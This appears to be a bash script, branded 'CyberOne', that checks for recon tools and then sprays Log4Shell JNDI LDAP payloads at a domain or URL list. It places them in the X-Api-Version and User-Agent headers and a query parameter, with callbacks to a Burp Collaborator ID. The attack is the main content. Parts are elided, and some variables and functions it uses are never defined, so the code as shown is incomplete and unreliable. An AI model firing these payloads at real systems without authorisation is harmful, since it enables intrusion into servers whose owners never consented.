#! /bin/bash


#	░█████╗░██╗░░░██╗██████╗░███████╗██████╗░░█████╗░███╗░░██╗███████╗
#	██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗░██║██╔════╝
#	██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██║░░██║██╔██╗██║█████╗░░
#	██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║░░██║██║╚████║██╔══╝░░
#	╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║╚█████╔╝██║░╚███║███████╗
#	░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝


doesCommandExist() {
    command -v "$1" >/dev/null 2>&1
    if [[ $? -ne 0 ]]; then
      echo -e "$(tput setaf 3)$1 $(tput sgr0)"
    fi
}

domainScan-DoesCommandExistReqText() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      echo -e "\n$(tput setaf 3 ; tput rev ; tput bold) ! Warning ! $(tput sgr0)"      
      echo -e "$(tput setaf 3)Using this feature requires special requirements. It has been detected that the requirements are not installed on your system. $(tput sgr0)"
      echo -e "\n$(tput setaf 3 ; tput bold)Please install these tools: $(tput sgr0)"
    fi
}

#... (Same for other functions)

domainScan() {
    local domain=$1
    local burpcollabid=$2
    domainScan-DoesCommandExistReqText
    for COMMAND in "curl" "httpx" "assetfinder" "subfinder" "amass"; do
      doesCommandExist "${COMMAND}"
    done
    doesCommandExistReqMoreInfo
    domainScan-DoesCommandExistReqExit

    #... (Same for other parts)

    curl -s --insecure --max-time 20 "$url" -H "X-Api-Version: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
    curl -s --insecure --max-time 20 "$url/?test=\${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
    curl -s --insecure --max-time 20 "$url" -H "User-Agent: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m"
}

#... (Same for listScan function)

while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -l | --url-list )
    shift
        local list=$1
    ;;
  -d | --domain )
    shift
    local domain=$1
    ;;
  -b | --burpcollabid )
    shift
    local burpcollabid=$1
    ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

if [[ -n $domain ]]; then
  domainScan $domain $burpcollabid
elif [[ -n $list ]]; then
  listScan $list $burpcollabid
else
  echo "Please provide a domain (-d) or a URL list (-l) and a burp collaborator ID (-b)"
fi

